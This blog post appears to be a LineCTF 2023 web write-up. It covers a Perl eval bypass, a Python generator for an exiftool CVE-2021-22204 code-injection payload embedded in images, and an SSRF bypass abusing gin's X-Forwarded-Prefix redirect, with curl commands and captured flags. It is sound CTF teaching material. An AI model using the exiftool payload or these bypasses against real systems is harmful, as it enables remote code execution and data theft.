---
title: LineCTF 2023 - web (partial)
date: 2023-03-27 16:53:17
tags: [ctf]
---

to be continued…

## Old Pal

Just an appetizer.

Input a password to make the expression eval to true and pass filters.

```perl
my $q = CGI->new;
print "Content-Type: text/html\n\n";

...

my $pw = uri_unescape(scalar $q->param("password"));
if (eval("$pw == 20230325")) {
    print "Congrats! Flag is LINECTF{redacted}"
} else {
    print "wrong password :(";
    die();
};
```

Restrictions:

- no longer then 20
- only letters, digits, underscore (`_`), dash (`-`)
- at least one letter, one digit, one of `_` and `-`
- no hex, oct, bin, and scientifical notation

```perl
if (length($pw) >= 20) {
    print "Too long :(";
    die();
}
if ($pw =~ /[^0-9a-zA-Z_-]/) {
    print "Illegal character :(";
    die();
}
if ($pw !~ /[0-9]/ || $pw !~ /[a-zA-Z]/ || $pw !~ /[_-]/) {
    print "Weak password :(";
    die();
}
if ($pw =~ /[0-9_-][boxe]/i) {
    print "Do not punch me :(";
    die();
}
```

And no code injection (highly impossible and the related code is omitted here).

And a vague restriction.

```perl
if ($pw =~ /[Mx. squ1ffy]/i) {
    print "You may have had one too many Old Pal :(";
    die();
}
```

An easy thinking is to find some expression eval to 20230325. And an intuitive construction is `20230326-xxx`, where `xxx` is something interesting.

In fact, there are some special builtin functions in perl. The one we need is `__LINE__`, which returns the current line number. In the eval context in this challenge, it will return 1.

Hence, the final exp is:

```bash
$ curl 'http://104.198.120.186:11006/cgi-bin/main.pl?password=20230326-__LINE__'
Congrats! Flag is LINECTF{3e05d493c941cfe0dd81b70dbf2d972b}
```

Another choice is to using the v-string in Perl:

> A literal of the form v1.20.300.4000 is parsed as a string composed of characters with the specified ordinals. This form is known as v-strings.
>
> A v-string provides an alternative and more readable way to construct strings, rather than use the somewhat less readable interpolation form "\x{1}\x{14}\x{12c}\x{fa0}".

So just use `v48` to represent 0:

```bash
$ curl 'http://104.198.120.186:11006/cgi-bin/main.pl?password=20230325-v48'
Congrats! Flag is LINECTF{3e05d493c941cfe0dd81b70dbf2d972b}
```


## Imagexif

First, from the dockerfile can we know the version of exiftool used in this challenge is 12.22, which is vulnerable (CVE-2021-22204) and may lead to RCE.

```dockerfile
RUN wget https://github.com/exiftool/exiftool/archive/refs/tags/12.22.tar.gz && \
    tar xvf 12.22.tar.gz && \
    cp -fr /exiftool-12.22/* /usr/bin && \
    rm -rf /exiftool-12.22 && \
    rm 12.22.tar.gz
```

There are many exploits or analysis articles on the network. Just choose any.

Here we choose [this one](https://github.com/convisolabs/CVE-2021-22204-exiftool.git).

A problem is that the python backend is run in an internal network and has no access to public network, that is, we cannot establish a reverse shell, which would be the first choice to get the flag.

Though there are still many approaches to get flag, here we use a small trick to do this "elegantly".

From the exploiting script we can notice that the vulnerability is code injection rather than command execution in fact, and RCE is achieved by invoking `system` function.

Hence we have the capability to execute perl code in an "eval" context.

```python
#!/usr/bin/env python3

import base64
import subprocess

code = 'perl code here'

payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"
payload = payload + base64.b64encode( code.encode() )
payload = payload + b"'))};\")"

payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()

subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg']) 

```

If we inject some mess code that would throw a warning, for example, use `code = '$a=$a+1'` and upload the malicious image, the web page will produce following output of exif info:

```
SourceFile: tmp/ac76c800-c203-4813-94ca-934b7bc8da1b
ExifTool:ExifToolVersion: 12.22
ExifTool:Warning: RawConv HasselbladExif: Use of uninitialized value $Image::ExifTool::DjVu::a in addition (+)
File:FileName: ac76c800-c203-4813-94ca-934b7bc8da1b
...
```

Note that the warning message is printed as an entry of exif info!

Then things go easy. Just use the builtin `warn` function to print the flag as a warning message. Since the flag is stored as an environment variable, the payload is just `use Env; warn $FLAG;`.

And then the flag will be shown on the web page.

```
SourceFile: tmp/9ce3c18c-3301-49a9-822d-9f6789171553
ExifTool:ExifToolVersion: 12.22
ExifTool:Warning: RawConv HasselbladExif: LINECTF{2a38211e3b4da95326f5ab593d0af0e9}
File:FileName: 9ce3c18c-3301-49a9-822d-9f6789171553
```


## Adult Simple GoCurl

The server serves three api:

- `/`, just index.html
- `/curl/`, a SSRF service
- `/flag/`, return flag but only for RemoteAddr `127.0.0.1`, which cannot be forged.

The main thinking is to access `/flag/` through `/curl/`, but there are some restriction for the `url` query parameter:

```go
if strings.Contains(reqUrl, "flag")
|| strings.Contains(reqUrl, "curl")
|| strings.Contains(reqUrl, "%") {
    c.JSON(http.StatusBadRequest, gin.H{"message": "Something wrong 1"})
    return
}
```

Keyword `flag` and `curl` are filtered. A direct counter is using redirection. However, the server only accept redirections from `127.0.0.1` by adding a redirection checker to the http client.

```go
func redirectChecker(req *http.Request, via []*http.Request) error {
    reqIp := strings.Split(via[len(via)-1].Host, ":")[0]

    if len(via) >= 2 || reqIp != "127.0.0.1" {
        log.Println("not redirect from 127.0.0.1")
        return errors.New("something wrong")
    }

    return nil
}
```

One may attempt to forge the `Host` header by passing `header_key=Host&header_value=127.0.0.1` as the query parameter of the `/curl/` api since it offers such a chance to set a header. But this won't work because the `Host` header is not set from the `req.Header`. Instead,  it is set according to the url to request.

The only possibility to solve this challenge is to leverage the redirects sent by the server itself. But there is no explict redirection in the source code (`main.go`).

If one have mistyped the request path `/curl/` as `/curl`, he may find the server response a 301 rather than a 404:

```http
$ curl 'http://34.84.87.77:11001/curl' -v
*   Trying 34.84.87.77:11001...
* Connected to 34.84.87.77 (34.84.87.77) port 11001 (#0)
> GET /curl HTTP/1.1
> Host: 34.84.87.77:11001
> User-Agent: curl/7.81.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Content-Type: text/html; charset=utf-8
< Location: /curl/
< Date: Mon, 27 Mar 2023 08:05:18 GMT
< Content-Length: 41
<
<a href="/curl/">Moved Permanently</a>.

* Connection #0 to host 34.84.87.77 left intact
```

This gives us the clue. The gin framework may have some features about url correction using redirection, which can be leveraged.

Look up the source code the gin framework, we find such a snippet in function `gin.go/handleHTTPRequest`

```go
if httpMethod != http.MethodConnect && rPath != "/" {
    if value.tsr && engine.RedirectTrailingSlash {
        redirectTrailingSlash(c)
        return
    }
    if engine.RedirectFixedPath && redirectFixedPath(c, root, engine.RedirectFixedPath) {
        return
    }
}
```

In the definition of the function `redirectTrailingSlash`, a header named `X-Forwarded-Prefix` is checked. Obviously that's what we want.

```go
func redirectTrailingSlash(c *Context) {
	req := c.Request
	p := req.URL.Path
	if prefix := path.Clean(c.Request.Header.Get("X-Forwarded-Prefix")); prefix != "." {
		prefix = regSafePrefix.ReplaceAllString(prefix, "")
		prefix = regRemoveRepeatedChar.ReplaceAllString(prefix, "/")

		p = prefix + "/" + req.URL.Path
	}
	req.URL.Path = p + "/"
	if length := len(p); length > 1 && p[length-1] == '/' {
		req.URL.Path = p[:length-1]
	}
	redirectRequest(c)
}
```

The remaining thing is simple, finding a path that will be redirected to `/` and set the header `X-Forwarded-Prefix` to `/flag/`. The final exp:

```bash
$ curl 'http://34.84.87.77:11001/curl/?url=http://127.0.0.1:8080//&header_key=X-Forwarded-Prefix&header_value=/flag'
{"body":"{\"message\":\"= LINECTF{b80233bef0ecfa0741f0d91269e203d4}\"}","status":"200 OK"}
```


## Flag Masker

